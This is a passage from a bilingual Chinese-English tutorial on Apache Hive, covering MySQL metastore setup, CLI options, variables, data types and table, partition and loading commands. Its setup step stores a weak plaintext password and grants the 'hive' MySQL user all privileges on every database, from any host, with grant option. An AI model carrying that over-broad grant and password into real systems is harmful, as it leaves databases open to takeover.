/user/hive/</span><br></pre></td></tr></table></figure></li><li><p>开启hive <code>hive</code></p></li></ol><h4 id="基于Mysql"><a href="#基于Mysql" class="headerlink" title="基于Mysql"></a>基于Mysql</h4><ol><li><p>jar包<br>mpsql - JDBC <a href="https://dev.mysql.com/downloads/connector/j/" target="_blank" rel="noopener">https://dev.mysql.com/downloads/connector/j/</a><br>这个jar包放在<code>${HIVE_HOME}/lib</code>中，</p></li><li><p><code>hive-site.xml</code>配置文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>javax.jdo.option.ConnectionURL<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>jdbc:mysql://192.168.0.104:3306/hive?useSSL=false<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 这里填自己的地址，URL里添加创建数据库好像我的不行 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>javax.jdo.option.ConnectionDriverName<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>com.mysql.jdbc.Driver<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>javax.jdo.option.ConnectionUserName<span class="tag">&lt;/<span class="name">name</span>&gt;</span> <span class="comment">&lt;!-- 用户名 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>hive<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>javax.jdo.option.ConnectionPassword<span class="tag">&lt;/<span class="name">name</span>&gt;</span> <span class="comment">&lt;!-- 密码 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>hive1234<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>system:java.io.tmpdir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>/user/hive/tmp<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.metastore.warehouse.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>/user/hive/warehouse<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.exec.scratdir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>/user/hive/tmp<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.querylog.location<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>/user/hive/log<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>mysql添加用户</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> hive;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">'hive'</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">'hive1234'</span>;</span><br><span class="line"><span class="keyword">GRANT</span> ALL <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> *.* <span class="keyword">TO</span> <span class="string">'hive'</span>@<span class="string">'%'</span> <span class="keyword">WITH</span> <span class="keyword">GRANT</span> <span class="keyword">OPTION</span>;</span><br></pre></td></tr></table></figure></li><li><p>初始化数据库<br><code>schematool -initSchema -dbType mysql</code></p></li><li><p>启动hive <code>hive</code></p></li></ol><h3 id="CLI-Options"><a href="#CLI-Options" class="headerlink" title="CLI Options"></a>CLI Options</h3><p>The Hive command line interface (CLI) is used to interact with Hive. Users can use CLI commands to create, manage, and query tables.<br>Hive命令行接口(CLI)用于与Hive交互。用户可以使用CLI命令来创建、管理和查询表。<br>You can view the related instructions of Hive through the help command of Hive.<br>你可以通过Hive的help命令查看Hive的相关指令。 <code>hive --help --service cli</code></p><div class="table-container"><table><thead><tr><th style="text-align:center">Usage</th><th style="text-align:center">Description</th></tr></thead><tbody><tr><td style="text-align:center"><code>-d,--define &lt;key=value&gt;</code></td><td style="text-align:center">Variable subsitution to apply to hive commands. e.g. <code>hive -d A=B</code></td></tr><tr><td style="text-align:center"><code>--database &lt;databasename&gt;</code></td><td style="text-align:center">Specify the database to use</td></tr><tr><td style="text-align:center"><code>-e &lt;quoted-query-string&gt;</code></td><td style="text-align:center">SQL from command line</td></tr><tr><td style="text-align:center"><code>-f &lt;filename&gt;</code></td><td style="text-align:center">SQL from file</td></tr><tr><td style="text-align:center"><code>-H, --help</code></td><td style="text-align:center">Print help information</td></tr><tr><td style="text-align:center"><code>--hiveconf &lt;property=value&gt;</code></td><td style="text-align:center">Use value for give property</td></tr><tr><td style="text-align:center"><code>--hivevar &lt;key=value&gt;</code></td><td style="text-align:center">Varibale subsitution to apply to hive commands.</td></tr><tr><td style="text-align:center"><code>-i &lt;filename&gt;</code></td><td style="text-align:center">Initialization SQL file</td></tr><tr><td style="text-align:center"><code>-S, --silent</code></td><td style="text-align:center">Silent mode in interactive shell</td></tr><tr><td style="text-align:center"><code>-v,--verbose</code></td><td style="text-align:center">Verbose mode (echo executed SQL to the console)</td></tr></tbody></table></div><h3 id="Variable-setting"><a href="#Variable-setting" class="headerlink" title="Variable setting"></a>Variable setting</h3><p>Hive variables are preceded by a namespace, including 4 hiveconf, system, env, and hivevar.<br>Hive变量前有一个名称空间，包括这4个:  hiveconf、system、env和hivevar。</p><ul><li>hiveconf: refers to the value of configuration variables under hive-site.xml.<br>hiveconf: 指的是hive-site.xml下的配置变量的值。</li><li>system: is a system variable, including the running environment of the JVM.<br>system: 是一个系统变量，包括JVM的运行环境。</li><li>env: refers to environment variables, including variable information in the Shell environment, such as HADOOP_HOME.<br>env: 指的是环境变量，包括Shell环境中的变量信息，如HADOOP_HOME。</li><li><p>hivevar: user-defined variable.<br>hivevar: 用户定义的变量。</p></li><li><p>Ordinary variables can be declared with <code>--define key = value</code> or <code>--hivevar key = value</code>, which all represent variables that are hivevar.<br>普通变量可以用<code>-- define key = value</code> 或 <code>-- hivevar key = value</code> 声明，它们都表示变量是hivevar。</p></li><li><code>hive --hiveconf mapreduce.job.queuename=queue1</code><br>This setting is valid for the session started this time and needs to be reconfigured for the next startup.<br>此设置对这次启动的会话有效，下一次启动需要重新配置。</li><li>Set or display variables through set in hive.<br>通过在Hive中设置或显示变量。<code>set &lt;varname&gt;</code></li></ul><h3 id="Hive-Command-line"><a href="#Hive-Command-line" class="headerlink" title="Hive Command line"></a>Hive Command line</h3><ul><li>One-time query 一次性查询<br><code>$HIVE_HOME/bin/hive -e &#39;select a.col from tab1 a&#39;</code><br>The progress of mapreduce will be displayed on the terminal. Mapreduce的进度将显示在终端上。<br>The query results are finally output to the terminal, and hive process exits 查询结果最终输出到终端，Hive进程退出</li><li>Quiet mode query 安静模式查询<br><code>$HIVE_HOME/bin/hive  -S -e &#39;select a.ueserid from tab1 log&#39;</code><br>Adding  <code>-S</code>, will only output the query results to the terminal. 添加 <code>–S</code>，仅将查询结果输出到终端。<br>This silent mode is called by a third-party program, the third-party program obtains the result set through the standard output of hive. 这种静音模式是由第三方程序调用的，第三方程序通过Hive的标准输出获取结果集。</li><li>Execute script 执行脚本<br><code>$HIVE_HOME/bin/hive -f /home/my/hive-script.sql</code><br><code>hive-script.sql</code> is a script file written using hive sql syntax. The execution process is similar to <code>-e</code>, except that sql is loaded from a file.<br><code>hive-script.sql</code>是一个使用Hive SQL语法编写的脚本文件。执行过程类似于<code>-e</code>，只是SQL是从一个文件加载的。</li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">Command</th><th style="text-align:center">Description</th></tr></thead><tbody><tr><td style="text-align:center"><code>quit/exit</code></td><td style="text-align:center">Exit the interactive shell</td></tr><tr><td style="text-align:center"><code>Reset</code></td><td style="text-align:center">Reset configuration to default</td></tr><tr><td style="text-align:center"><code>set &lt;key&gt;=&lt;value&gt;</code></td><td style="text-align:center">Modify the value of a specific variableNote: If the variable name is misspelled, no error will be reported</td></tr><tr><td style="text-align:center"><code>Set</code></td><td style="text-align:center">Output user-overwritten hive configuration variables</td></tr><tr><td style="text-align:center"><code>set -v</code></td><td style="text-align:center">Output all Hadoop and Hive configuration variables</td></tr><tr><td style="text-align:center"><code>add FILE[S] &lt;filepath&gt; &lt;filepath&gt;*</code> <br> <code>add JAR[S] &lt;filepath&gt; &lt;filepath&gt;*</code> <br> <code>add ARCHIVE[S] &lt;filepath&gt; &lt;filepath&gt;*</code></td><td style="text-align:center">Add one or more files, jars, archives to the distributed cache</td></tr><tr><td style="text-align:center"><code>list FILE[S]</code> <br> <code>list JAR[S]</code> <br> <code>list ARCHIVE[S]</code></td><td style="text-align:center">Outputs resources that have been added to the distributed cache.</td></tr><tr><td style="text-align:center"><code>list FILE[S] &lt;filepath&gt;*</code> <br> <code>list JAR[S] &lt;filepath&gt;*</code> <br> <code>list ARCHIVE[S] &lt;filepath&gt;*</code></td><td style="text-align:center">Check if given resource is added to distributed cache</td></tr><tr><td style="text-align:center"><code>delete FILE[S] &lt;filepath&gt;*</code> <br> <code>delete JAR[S] &lt;filepath&gt;*</code> <br> <code>delete ARCHIVE[S] &lt;filepath&gt;*</code></td><td style="text-align:center">Deletes the specified resource from the distributed cache</td></tr><tr><td style="text-align:center"><code>! &lt;command&gt;</code></td><td style="text-align:center">Execute a shell command from the Hive shell</td></tr><tr><td style="text-align:center"><code>dfs &lt;dfs command&gt;</code></td><td style="text-align:center">Execute a dfs command from the Hive shell</td></tr><tr><td style="text-align:center"><code>&lt;query string&gt;</code></td><td style="text-align:center">Execute a Hive query and output the results to standard output</td></tr><tr><td style="text-align:center"><code>source FILE &lt;filepath&gt;</code></td><td style="text-align:center">Execute a hive script file in the CLI</td></tr></tbody></table></div><h3 id="HIVE-Data-Type"><a href="#HIVE-Data-Type" class="headerlink" title="HIVE Data Type"></a>HIVE Data Type</h3><p>Primary data types<br>TINYINT, SMALLINT, INT, BIGINT, FLOAT, DOUBLE, BOOLEAN, STRING<br>Complex Data Types</p><div class="table-container"><table><thead><tr><th style="text-align:center">Type</th><th style="text-align:center">Description</th><th style="text-align:center">Example</th></tr></thead><tbody><tr><td style="text-align:center">ARRAY</td><td style="text-align:center">A set of ordered fields. Field must be of same type.</td><td style="text-align:center"><code>Array(1, 2)</code></td></tr><tr><td style="text-align:center">MAP</td><td style="text-align:center">An unordered set of key/value pairs. The key type must be atomic, the value can be any type. The key type of the same mapping must be the same, and the value type must be the same.</td><td style="text-align:center"><code>Map(&#39;a&#39;, 1, &#39;b&#39;, 2)</code></td></tr><tr><td style="text-align:center">STRUCT</td><td style="text-align:center">A set of named fields. The field type can be different.</td><td style="text-align:center"><code>Struct(&#39;a&#39;,1,1,0)</code></td></tr></tbody></table></div><h2 id="Chapter-2"><a href="#Chapter-2" class="headerlink" title="Chapter 2"></a>Chapter 2</h2><h3 id="Database-Operations"><a href="#Database-Operations" class="headerlink" title="Database Operations"></a>Database Operations</h3><ul><li>SHOW DATABASE: <code>show databases;</code></li><li><p>CREATE DATABASE: </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Create</span> [<span class="keyword">EXTERNAL</span>] <span class="keyword">TABLE</span> [<span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>] table_name </span><br><span class="line">[(col_name data_type [<span class="keyword">COMMENT</span> col_comment], ...)] </span><br><span class="line">[<span class="keyword">COMMENT</span> table_comment] </span><br><span class="line">[PARTITIONED <span class="keyword">BY</span> (col_name data_type [<span class="keyword">COMMENT</span> col_comment], ...)] </span><br><span class="line">[CLUSTERED <span class="keyword">BY</span> (col_name, col_name, ...) </span><br><span class="line">[SORTED <span class="keyword">BY</span> (col_name [<span class="keyword">ASC</span>|<span class="keyword">DESC</span>], ...)] <span class="keyword">INTO</span> num_buckets BUCKETS] </span><br><span class="line">[<span class="keyword">ROW</span> <span class="keyword">FORMAT</span> <span class="keyword">DELIMITED</span> row_format] </span><br><span class="line">[<span class="keyword">STORED</span> <span class="keyword">AS</span> file_format] </span><br><span class="line">[LOCATION hdfs_path]</span><br></pre></td></tr></table></figure></li><li><p>USE DATABASE: <code>use database;</code></p></li><li>DELETE DATABASE: <code>DROP DATABASE [IF EXISTS] &lt;database name&gt;</code></li></ul><h3 id="Table-Operations"><a href="#Table-Operations" class="headerlink" title="Table Operations"></a>Table Operations</h3><ul><li><p>CREATE TABLE  :<br>Creates a table with the specified name.<br>If a table with the same name already exists, an exception is thrown;<br>The user can use the IF NOT EXIST option to ignore this exception. </p></li><li><p>EXTERNAL :<br>External  keyword allows users to create an external table, and specify a path to the actual data (LOCATION).<br>When you delete external table only deletes the metadata, not the data.</p></li><li><p>ROW FORMAT DELIMITED] :<br>[ROW FORMAT DELIMITED]keyword is used to set the column separators supported by the created table when loading data.</p></li><li>[STORED AS file_format] :<br>specifies the file storage format. The default is TEXTFILE. If the file data is plain text, [STORED AS TEXTFILE] is used and then copied directly to HDFS from the local.</li><li>Partitioned tables can be created using the PARTITIONED BY statement. A table can have one or more partitions, and each partition exists in a separate directory. </li><li>Both tables and partitions can perform a CLUSTERED BY operation on a certain column and put several columns into a bucket. You can also use SORT BY to sort the data. This can improve performance for specific applications.</li></ul><h4 id="File-formats"><a href="#File-formats" class="headerlink" title="File formats"></a>File formats</h4><ul><li><p>TEXTFILE:<br>The TEXTFILE is default format. Data is not compressed. It has a large disk overhead and a large data parsing overhead.</p></li><li><p>SEQUENCEFILE:<br>SEQUENCEFILE a binary file support provided by the Hadoop API, which is easy to use, splittable and compressible.</p></li><li><p>RCFILE:<br>RCFILE is a combination of row and column storage.</p></li><li><p>Custom format: </p><ul><li>When the user’s data file format cannot be recognized by the current Hive, you can customize the file format.</li><li>Users can customize input and output formats by implementing inputformat and outputformat.</li></ul></li></ul><h4 id="CREATE-TABLE"><a href="#CREATE-TABLE" class="headerlink" title="CREATE TABLE"></a>CREATE TABLE</h4><ul><li>Create a normal table：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> Emp_table (<span class="keyword">id</span> <span class="built_in">int</span>,<span class="keyword">name</span> <span class="keyword">string</span>,<span class="keyword">no</span> <span class="built_in">int</span>) </span><br><span class="line"><span class="keyword">row</span> <span class="keyword">format</span> <span class="keyword">delimited</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">',’ stored as textfile;</span></span><br></pre></td></tr></table></figure></li></ul><p>Note : A field separator is specified. HIVE only supports a single character separator. The default delimiter for hive is \ 001.</p><ul><li>Create a partitioned table<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> Emp_partition (<span class="keyword">id</span> <span class="built_in">int</span>,<span class="keyword">name</span> <span class="keyword">string</span>,<span class="keyword">no</span> <span class="built_in">int</span>) partitioned <span class="keyword">by</span> (dt <span class="keyword">string</span>) </span><br><span class="line"><span class="keyword">row</span> <span class="keyword">format</span> <span class="keyword">delimited</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">',’  stored as textfile ;</span></span><br></pre></td></tr></table></figure></li></ul><p>load data local inpath <code>&#39;/opt/niit/hive/test_hive.txt&#39;</code> overwrite into table test_partition partition (dt=’2015-06-15’);</p><ul><li><p>Create a bucket table</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> Emp_bucket (<span class="keyword">id</span> <span class="built_in">int</span>,<span class="keyword">name</span> <span class="keyword">string</span>,<span class="keyword">no</span> <span class="built_in">int</span>) partitioned <span class="keyword">by</span> (dt <span class="keyword">string</span>) </span><br><span class="line">clustered <span class="keyword">by</span> (<span class="keyword">id</span>) sorted <span class="keyword">by</span>(<span class="keyword">name</span>) <span class="keyword">into</span> <span class="number">3</span> buckets </span><br><span class="line"><span class="keyword">row</span> <span class="keyword">format</span> <span class="keyword">delimited</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">','</span></span><br><span class="line"><span class="keyword">stored</span> <span class="keyword">as</span> textfile;</span><br></pre></td></tr></table></figure></li><li><p>Create an external table</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">external</span> <span class="keyword">table</span> Emp_external (<span class="keyword">id</span> <span class="built_in">int</span>,<span class="keyword">name</span> <span class="keyword">string</span>,<span class="keyword">no</span> <span class="built_in">int</span>)</span><br><span class="line"><span class="keyword">row</span> <span class="keyword">format</span> <span class="keyword">delimited</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">',’ ;</span></span><br></pre></td></tr></table></figure></li><li><p>Copy table structure</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> Emp_like_table <span class="keyword">like</span> Emp_bucket;</span><br></pre></td></tr></table></figure></li></ul><p>The above command copies table structure only, not content</p><h3 id="Modify-Table-Operations"><a href="#Modify-Table-Operations" class="headerlink" title="Modify Table Operations"></a>Modify Table Operations</h3><ul><li><p>Increase partition<br>Syntax：<code>ALTER TABLE table_name ADD partition_spec [ LOCATION &#39;location1&#39;] partition_spec [ LOCATION &#39;location2&#39; ]</code><br>Example：<code>alter table Emp_partition add partition (dt=&#39;2015-06-15&#39;)</code></p></li><li><p>Delete partition<br>Syntax：<code>ALTER TABLE table_name DROP partition_spec</code><br>Example：<code>alter table Emp_partition drop partition (dt=&#39;2015-06-15&#39;)</code><br>Description：After the partition is deleted, the metadata and data of the partition will be deleted together.</p></li></ul><h3 id="Table-Operations-1"><a href="#Table-Operations-1" class="headerlink" title="Table Operations"></a>Table Operations</h3><ul><li><p>Table rename<br>Syntax：<code>ALTER TABLE table_name RENAME TO new_table_name</code><br>Example：<code>alter table Emp_partition rename to new_Emp_partition;</code><br>Description：The location of the data and the partition name do not change.</p></li><li><p>Modify table column type<br>Syntax：<code>ALTER TABLE table_name CHANGE [COLUMN] col_old_name col_new_name column_type [COMMENT col_comment] [FIRST|AFTER column_name]</code><br>Example：<code>alter table New_Emp_partition change name name1 String;</code></p></li><li><p>Add column<br>Syntax：<code>ALTER TABLE table_name ADD|REPLACE COLUMNS (col_name data_type [COMMENT col_comment], ...)</code><br>Example：<code>alter table New_Emp_partition  add columns (age int);</code></p></li></ul><h3 id="Data-loading"><a href="#Data-loading" class="headerlink" title="Data loading"></a>Data loading</h3><ul><li>Hive does not support insert operations using insert statements one by one. It also  does not  support update operations.<br>Hive不支持使用一个接一个的插入语句进行插入操作。它也不支持更新操作。</li><li>The data is loaded into the established table in the manner of load.<br>数据以加载的方式加载到已建立的表中。</li><li>Once the data is imported, it cannot be modified.  We can either drop the entire table or create a new table and import the required data.<br>一旦数据被导入，它就不能被修改。 我们可以删除整个表，也可以创建一个新表并导入所需的数据。</li></ul><p>Syntax：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LOAD</span> <span class="keyword">DATA</span> [<span class="keyword">LOCAL</span>] INPATH <span class="string">'filepath'</span> [OVERWRITE] <span class="keyword">INTO</span> <span class="keyword">TABLE</span> tablename [<span class="keyword">PARTITION</span> (partcol1=val1, partcol2=val2 ...)]</span><br></pre></td></tr></table></figure></p><h3 id="Ways-to-Import-data-in-batches"><a href="#Ways-to-Import-data-in-batches" class="headerlink" title="Ways to Import data in batches"></a>Ways to Import data in batches</h3><ul><li>Load data and import to the specified table    加载数据并导入到指定的表<br>Import the local file system /home/data/aa.txt file into tab1,<br>syntax : <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> inpath <span class="string">'/home/data/aa.txt'</span> <span class="keyword">into</span> <span class="keyword">table</span> tab1;</span><br></pre></td></tr></table></figure></li></ul><p>Import the file directly to the partition of the specified table. If the partition directory does not exist, hive will automatically create a partition directory, and then copy the data to the directory.<br>将文件直接导入指定表的分区。如果分区目录不存在，HIVE将自动创建一个分区目录，然后将数据复制到该目录。</p><ul><li>Load to the partition of the specified table    加载到指定表的分区<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LOAD DATA LOCAL INPATH &apos;/home/admin/test/test.txt’</span><br><span class="line">OVERWRITE INTO TABLE test_1 PARTITION（pt=’xxxx’）</span><br></pre></td></tr></table></figure></li></ul><p>The keyword [OVERWRITE] means to overwrite the data in the original table. If it is not written, it will not be overwritten.<br>关键字[OVERWRITE]表示覆盖原始表中的数据。如果不写，就不会被覆盖。<br>The keyword [LOCAL] means that the source of the file you are loading is a local file. If you do not write, the file is hdfs.<br>关键字[LOCAL]表示正在加载的文件的源是一个本地文件。如果不写，文件是HDFS。</p><ul><li>Import data using insert + select<br>By querying the table, the query results are imported into the specified table.    通过查询表，查询结果被导入到指定的表中。<br>Syntax ：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> OVERWRITE <span class="keyword">TABLE</span> tablename1 [<span class="keyword">PARTITION</span> (partcol1=val1, partcol2=val2 ...)] select_statement1 <span class="keyword">FROM</span> from_statement</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">into</span> tab2 <span class="keyword">select</span> * <span class="keyword">from</span> tab1；</span><br></pre></td></tr></table></figure></li></ul><p>Import data using create+select<br>Create a new table and copy the data into this table.<br>创建一个新表并将数据复制到这个表中。<br>Syntax：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> tablename1 <span class="keyword">AS</span>  select_statement1 <span class="keyword">FROM</span> from_statement  </span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">table</span> tab2 <span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> tab1;</span><br></pre></td></tr></table></figure></p><h3 id="Management-tables"><a href="#Management-tables" class="headerlink" title="Management tables"></a>Management tables</h3><ul><li>The management table is also called an internal table.<br>管理表也称为内部表。</li><li>Hive controls the life cycle of the table and the data in the table.<br>Hive控制表的生命周期和表中的数据。</li><li>The data is stored in the directory set by the parameter hive.metastore.warehouse.dir in hive-site.xml.<br>数据存储在参数设置的目录中：</li><li>When Hive creates the internal tables, it moves the data to the path pointed to by the data warehouse.<br>当Hive创建内部表时，它将数据移动到数据仓库指向的路径。</li><li>When a management table is deleted, the corresponding data in the table is also deleted at the same time.<br>删除管理表时，同时也删除表中相应的数据。</li><li>We can create a management table by using the <code>create table</code> command.<br>我们可以使用create table命令来创建一个管理表。</li></ul><h3 id="External-tables"><a href="#External-tables" class="headerlink" title="External tables"></a>External tables</h3><ul><li>The data of the external table is not managed by hive, hive just establishes a reference.<br>外部表的数据不是由hive管理的，hive只是建立一个引用。</li><li>When deleting an external table, only the metadata of the table is deleted, not the data.<br>删除外部表时，只删除表的元数据，而不删除数据。</li><li>The external table is relatively more secure, and the data organization is more flexible, which facilitates the sharing of source data.<br>外部表相对更安全，数据组织也更灵活，这有助于共享源数据。</li><li>Create table Use “create EXTERNAL table” to create external tables.<br>创建表使用创建外部表来创建外部表。</li></ul><h3 id="Partition-Table"><a href="#Partition-Table" class="headerlink" title="Partition Table"></a>Partition Table</h3><ul><li>Hive Select query scan  the entire table  which  is time consuming.<br>在HIVE选择查询扫描整个表，这是耗时的。</li><li>Sometimes only a part of the data in the table needs to be scanned, so the partition concept was introduced when the table was created.<br>有时只需要扫描表中的一部分数据，因此在创建表时引入了分区概念。</li><li>A partitioned table refers to the partition space of the partition specified when the table was created.<br>分区表是指在创建表时指定的分区的分区空间。</li><li>To create a partitioned table, you need to use  the optional parameter partitioned by.<br>要创建分区表，需要使用可选的分区参数。</li><li>A table can have one or more partitions, and each partition exists in the directory of the table folder in the form of a folder.<br>一个表可以有一个或多个分区，每个分区都以文件夹的形式存在于表文件夹的目录中。</li><li>Table and column names are not case sensitive.<br>表名和列名不区分大小写。</li><li>Partitions exist in the table structure in the form of fields.<br>分区以字段的形式存在于表结构中。</li><li>You can see that the fields  through the <code>describe table</code> command, but this field does not store the actual data , they are only the representation of the partition.<br>你可以通过<code>describe table</code>命令看到这些字段，但是这个字段并不存储实际的数据，它们只是分区的表示。</li></ul><p>Types of partition table creation   分区表创建的类型</p><ul><li>Single partition: Which means that there is only one level folder directory under the table folder directory.<br>单分区: 这意味着在表文件夹目录下只有一个级别的文件夹目录。Statement: create table day_table (id int, content string) partitioned by (dt string);</li><li>Multi-partitioning: A multi-folder nesting mode appears under the table folder.<br>多分区: 在表文件夹下出现多文件夹嵌套模式。<br>Statement: <code>create table day_hour_table (id int, content string) partitioned by (dt string, hour string);</code></li><li>Dual partition table, partitioned by day and hour, added dt and hour two columns in the table structure.<br>双分区表，按日和时进行分区，在表结构中增加了dt和时两列。</li><li>Partition table contains Static partition and Dynamic partition<br>分区表包含静态分区和动态分区</li></ul><p>Static Partition Table</p><ul><li>It is recommended to create a partitioned column before importing data.<br>建议在导入数据之前创建分区列。</li><li>If you do not create the partition first, the partition is created automatically.<br>如果你没有首先创建分区，那么将会自动创建分区。</li></ul><p>Dynamic Partition Table</p><ul><li>Dynamic partitioning can be automatically matched to the corresponding partition according to the data obtained by the query.<br>动态分区可以根据查询得到的数据自动匹配到相应的分区。</li></ul><p>Example :<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> overwrite <span class="keyword">table</span> logs_partition_ex </span><br><span class="line">  <span class="keyword">partition</span>(stat_date=<span class="string">'2001-01-02'</span>,province) </span><br><span class="line">  <span class="keyword">select</span> member_id,<span class="keyword">name</span>,province <span class="keyword">from</span> logs_partition</span><br><span class="line">  